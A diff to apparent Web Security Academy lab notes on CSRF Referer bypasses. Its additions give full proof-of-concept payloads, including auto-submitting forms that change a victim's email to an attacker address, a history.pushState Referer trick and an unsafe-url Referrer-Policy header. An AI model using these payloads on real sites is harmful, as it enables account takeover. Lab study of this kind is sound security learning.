@@ -2111,7 +2111,7 @@ email=wiener@normal-user.com
     - **Remove Referer > success**
   -  Remove the referrer by including `<meta name="referrer" content="no-referrer">` under the head
      ```
-          <form action="https://0a5d00610484e26795fd0acc002e0061.web-security-academy.net/my-account/change-email" method="POST">
+          <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
             <input type="hidden" name="email" value="attacker&#64;normal&#45;user&#46;net" />
             <input type="submit" value="Submit request" />
           </form>
@@ -2121,17 +2121,23 @@ email=wiener@normal-user.com
      ```
 - CSRF with **broken Referer validation**
   - Application checks the Referer contains its own **domain name**
-  - Many browsers strip the query string from the Referer header by default. You can override this behavior by making sure that the response containing your exploit has the Referrer-Policy: unsafe-url header set
-  - Under HEAD, add `Referrer-Policy: unsafe-url`
-  - Under PoC CSRF > history.pushState (include the needed domain)   
+    `Referer: https://arbitrary-incorrect-domain.net.YOUR-LAB-ID.web-security-academy.net`
+  - Exploit server
+    File: YOUR-LAB-ID.web-security-academy.net
+    HEAD: add `Referrer-Policy: unsafe-url`
+    Body (Generate CSRF Poc)
     ```
-    <script>
-          history.pushState("", "", "?/0ae400270447f3468213256900ae00b8.web-security-academy.net");
+    Burp solution
+    history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net")
+
+    Final solution
+    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
+        <input type="hidden" name="email" value="attacker&#64;test&#46;com" />
+        <input type="submit" value="Submit request" />
+     </form>
+     <script>
+      document.forms[0].submit();
     </script>
-        <form action="https://0ae400270447f3468213256900ae00b8.web-security-academy.net/my-account/change-email" method="POST">
-            <input type="hidden" name="email" value="attacker&#64;test&#46;com" />
-            <input type="submit" value="Submit request" />
-         </form>
     ```
 
 ## CORS (Cross-Origin Resource Sharing)
